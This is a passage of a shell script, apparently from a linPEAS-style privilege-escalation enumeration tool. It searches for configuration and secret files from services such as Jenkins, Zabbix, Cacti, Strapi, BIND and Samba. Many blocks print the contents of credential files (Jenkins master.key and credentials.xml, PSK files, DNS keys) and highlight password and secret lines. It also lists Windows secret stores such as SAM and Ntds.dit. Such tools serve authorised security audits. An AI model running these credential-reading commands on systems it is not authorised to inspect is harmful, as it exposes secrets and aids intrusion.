    if ! [ "`echo \"$PSTORAGE_BOTO\" | grep -E \"\.boto$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".boto"; fi; fi; printf "%s" "$PSTORAGE_BOTO" | grep -E "\.boto$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.boto$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_INFLUXDB" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing InfluxDB Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_INFLUXDB\" | grep -E \"influxdb\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "influxdb.conf"; fi; fi; printf "%s" "$PSTORAGE_INFLUXDB" | grep -E "influxdb\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,influxdb\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,auth-enabled.*=.*false|token|https-private-key,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_ZABBIX" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Zabbix Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ZABBIX\" | grep -E \"zabbix_server\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "zabbix_server.conf"; fi; fi; printf "%s" "$PSTORAGE_ZABBIX" | grep -E "zabbix_server\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,zabbix_server\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,DBName|DBUser|DBPassword,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_ZABBIX\" | grep -E \"zabbix_agentd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "zabbix_agentd.conf"; fi; fi; printf "%s" "$PSTORAGE_ZABBIX" | grep -E "zabbix_agentd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,zabbix_agentd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,TLSPSKFile|psk,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_ZABBIX\" | grep -E \"zabbix$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "zabbix"; fi; fi; printf "%s" "$PSTORAGE_ZABBIX" | grep -E "zabbix$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,zabbix$,${SED_RED},"; find "$f" -name "*.psk" | while read ff; do ls -ld "$ff" | sed -${E} "s,.psk,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_PRE_SHARED_KEYS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Pre-Shared Keys Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_PRE_SHARED_KEYS\" | grep -E \"\.psk$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.psk"; fi; fi; printf "%s" "$PSTORAGE_PRE_SHARED_KEYS" | grep -E "\.psk$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.psk$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_PASS_STORE_DIRECTORIES" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Pass Store Directories Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_PASS_STORE_DIRECTORIES\" | grep -E \"\.password-store$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".password-store"; fi; fi; printf "%s" "$PSTORAGE_PASS_STORE_DIRECTORIES" | grep -E "\.password-store$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.password-store$,${SED_RED},"; ls -lRA "$f";done; echo "";
fi


if [ "$PSTORAGE_SAMBA" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Samba Files (limit 70)"
    smbstatus 2>/dev/null
    if ! [ "`echo \"$PSTORAGE_SAMBA\" | grep -E \"smb\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "smb.conf"; fi; fi; printf "%s" "$PSTORAGE_SAMBA" | grep -E "smb\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,smb\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "browseable|read only|writable|guest ok|enable privileges|create mask|directory mask|logon script|magic script|magic output" | sed -${E} "s,browseable.*yes|read only.*no|writable.*yes|guest ok.*yes|enable privileges.*yes|create mask.*|directory mask.*|logon script.*|magic script.*|magic output.*,${SED_RED},g" | sed -${E} "s,browseable.*no|read only.*yes|writable.*no|guest ok.*no|enable privileges.*no,${SED_GOOD},g"; done; echo "";
fi


if [ "$PSTORAGE_DNS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing DNS Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_DNS\" | grep -E \"bind$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "bind"; fi; fi; printf "%s" "$PSTORAGE_DNS" | grep -E "bind$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,bind$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; done; echo "";find "$f" -name "*.key" | while read ff; do ls -ld "$ff" | sed -${E} "s,.key,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";find "$f" -name "named.conf*" | while read ff; do ls -ld "$ff" | sed -${E} "s,named.conf.*,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#|//" | sed -${E} "s,allow-query|allow-recursion|allow-transfer|zone-statistics|file .*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_SEEDDMS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing SeedDMS Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SEEDDMS\" | grep -E \"seeddms.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "seeddms*"; fi; fi; printf "%s" "$PSTORAGE_SEEDDMS" | grep -E "seeddms.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,seeddms.*$,${SED_RED},"; find "$f" -name "settings.xml" | while read ff; do ls -ld "$ff" | sed -${E} "s,settings.xml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "=" | sed -${E} "s,[pP][aA][sS][sS],${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_DDCLIENT" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Ddclient Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_DDCLIENT\" | grep -E \"ddclient\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ddclient.conf"; fi; fi; printf "%s" "$PSTORAGE_DDCLIENT" | grep -E "ddclient\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ddclient\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*password.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_SENTRY" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Sentry Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SENTRY\" | grep -E \"sentry$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sentry"; fi; fi; printf "%s" "$PSTORAGE_SENTRY" | grep -E "sentry$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sentry$,${SED_RED},"; find "$f" -name "config.yml" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.yml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,*key*,${SED_RED},g"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_SENTRY\" | grep -E \"sentry\.conf\.py$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sentry.conf.py"; fi; fi; printf "%s" "$PSTORAGE_SENTRY" | grep -E "sentry\.conf\.py$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sentry\.conf\.py$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,[pP][aA][sS][sS].*|[uU][sS][eE][rR].*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_STRAPI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Strapi Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_STRAPI\" | grep -E \"environments$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "environments"; fi; fi; printf "%s" "$PSTORAGE_STRAPI" | grep -E "environments$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,environments$,${SED_RED},"; find "$f" -name "custom.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,custom.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "database.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,database.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "request.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,request.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "response.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,response.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "security.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,security.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";find "$f" -name "server.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,server.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|[pP][aA][sS][sS].*|secret.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_CACTI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Cacti Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CACTI\" | grep -E \"cacti$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "cacti"; fi; fi; printf "%s" "$PSTORAGE_CACTI" | grep -E "cacti$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,cacti$,${SED_RED},"; find "$f" -name "config.php" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.php,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "database_pw|database_user|database_pass|database_type|database_default|detabase_hostname|database_port|database_ssl" | sed -${E} "s,database_pw.*|database_user.*|database_pass.*,${SED_RED},g"; done; echo "";find "$f" -name "config.php.dist" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.php.dist,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "database_pw|database_user|database_pass|database_type|database_default|detabase_hostname|database_port|database_ssl" | sed -${E} "s,database_pw.*|database_user.*|database_pass.*,${SED_RED},g"; done; echo "";find "$f" -name "installer.php" | while read ff; do ls -ld "$ff" | sed -${E} "s,installer.php,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "database_pw|database_user|database_pass|database_type|database_default|detabase_hostname|database_port|database_ssl" | sed -${E} "s,database_pw.*|database_user.*|database_pass.*,${SED_RED},g"; done; echo "";find "$f" -name "check_all_pages" | while read ff; do ls -ld "$ff" | sed -${E} "s,check_all_pages,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "database_pw|database_user|database_pass|database_type|database_default|detabase_hostname|database_port|database_ssl" | sed -${E} "s,database_pw.*|database_user.*|database_pass.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_ROUNDCUBE" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Roundcube Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ROUNDCUBE\" | grep -E \"roundcube$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "roundcube"; fi; fi; printf "%s" "$PSTORAGE_ROUNDCUBE" | grep -E "roundcube$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,roundcube$,${SED_RED},"; find "$f" -name "config.inc.php" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.inc.php,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "config\[" | sed -${E} "s,db_dsnw,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_PASSBOLT" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Passbolt Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_PASSBOLT\" | grep -E \"passbolt\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "passbolt.php"; fi; fi; printf "%s" "$PSTORAGE_PASSBOLT" | grep -E "passbolt\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,passbolt\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "host|port|username|password|database" | grep -Ev "^#" | sed -${E} "s,[pP][aA][sS][sS].*|[uU][sS][eE][rR].*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_JETTY" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Jetty Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_JETTY\" | grep -E \"jetty-realm\.properties$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "jetty-realm.properties"; fi; fi; printf "%s" "$PSTORAGE_JETTY" | grep -E "jetty-realm\.properties$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,jetty-realm\.properties$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_JENKINS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Jenkins Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_JENKINS\" | grep -E \"master\.key$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "master.key"; fi; fi; printf "%s" "$PSTORAGE_JENKINS" | grep -E "master\.key$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,master\.key$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_JENKINS\" | grep -E \"hudson\.util\.Secret$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "hudson.util.Secret"; fi; fi; printf "%s" "$PSTORAGE_JENKINS" | grep -E "hudson\.util\.Secret$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,hudson\.util\.Secret$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_JENKINS\" | grep -E \"credentials\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "credentials.xml"; fi; fi; printf "%s" "$PSTORAGE_JENKINS" | grep -E "credentials\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,credentials\.xml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,secret.*|password.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_JENKINS\" | grep -E \"config\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "config.xml"; fi; fi; printf "%s" "$PSTORAGE_JENKINS" | grep -E "config\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,config\.xml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "secret.*|password.*" | sed -${E} "s,secret.*|password.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_JENKINS\" | grep -E \"jenkins$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*jenkins"; fi; fi; printf "%s" "$PSTORAGE_JENKINS" | grep -E "jenkins$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,jenkins$,${SED_RED},"; find "$f" -name "build.xml" | while read ff; do ls -ld "$ff" | sed -${E} "s,build.xml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "secret.*|password.*" | sed -${E} "s,secret.*|password.*,${SED_RED},g"; done; echo "";done; echo "";
fi




if [ "$PSTORAGE_INTERESTING_LOGS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Interesting logs Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_INTERESTING_LOGS\" | grep -E \"access\.log$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "access.log"; fi; fi; printf "%s" "$PSTORAGE_INTERESTING_LOGS" | grep -E "access\.log$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,access\.log$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_INTERESTING_LOGS\" | grep -E \"error\.log$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "error.log"; fi; fi; printf "%s" "$PSTORAGE_INTERESTING_LOGS" | grep -E "error\.log$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,error\.log$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_WINDOWS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Windows Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"\.rdg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.rdg"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "\.rdg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.rdg$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"AppEvent\.Evt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "AppEvent.Evt"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "AppEvent\.Evt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,AppEvent\.Evt$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"autounattend\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "autounattend.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "autounattend\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,autounattend\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"ConsoleHost_history\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ConsoleHost_history.txt"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "ConsoleHost_history\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ConsoleHost_history\.txt$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"FreeSSHDservice\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "FreeSSHDservice.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "FreeSSHDservice\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,FreeSSHDservice\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"NetSetup\.log$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "NetSetup.log"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "NetSetup\.log$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,NetSetup\.log$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"Ntds\.dit$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Ntds.dit"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "Ntds\.dit$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Ntds\.dit$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"protecteduserkey\.bin$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "protecteduserkey.bin"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "protecteduserkey\.bin$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,protecteduserkey\.bin$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"RDCMan\.settings$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "RDCMan.settings"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "RDCMan\.settings$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,RDCMan\.settings$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"SAM$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "SAM"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "SAM$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,SAM$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"SYSTEM$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "SYSTEM"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "SYSTEM$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,SYSTEM$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"SecEvent\.Evt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "SecEvent.Evt"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "SecEvent\.Evt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,SecEvent\.Evt$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"appcmd\.exe$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "appcmd.exe"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "appcmd\.exe$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,appcmd\.exe$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"bash\.exe$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "bash.exe"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "bash\.exe$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,bash\.exe$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"datasources\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "datasources.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "datasources\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,datasources\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"default\.sav$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "default.sav"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "default\.sav$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,default\.sav$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"drives\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "drives.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "drives\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,drives\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"groups\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "groups.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "groups\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,groups\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"https-xampp\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "https-xampp.conf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "https-xampp\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,https-xampp\.conf$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"https\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "https.conf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "https\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,https\.conf$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"iis6\.log$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "iis6.log"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "iis6\.log$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,iis6\.log$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"index\.dat$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "index.dat"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "index\.dat$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,index\.dat$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"my\.cnf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "my.cnf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "my\.cnf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,my\.cnf$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"my\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "my.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "my\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,my\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"ntuser\.dat$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ntuser.dat"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "ntuser\.dat$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ntuser\.dat$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"pagefile\.sys$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pagefile.sys"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "pagefile\.sys$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pagefile\.sys$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"printers\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "printers.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "printers\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,printers\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"recentservers\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "recentservers.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "recentservers\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,recentservers\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"scclient\.exe$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "scclient.exe"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "scclient\.exe$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,scclient\.exe$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"scheduledtasks\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "scheduledtasks.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "scheduledtasks\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,scheduledtasks\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"security\.sav$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "security.sav"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "security\.sav$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,security\.sav$,${SED_RED},"; done; echo "";
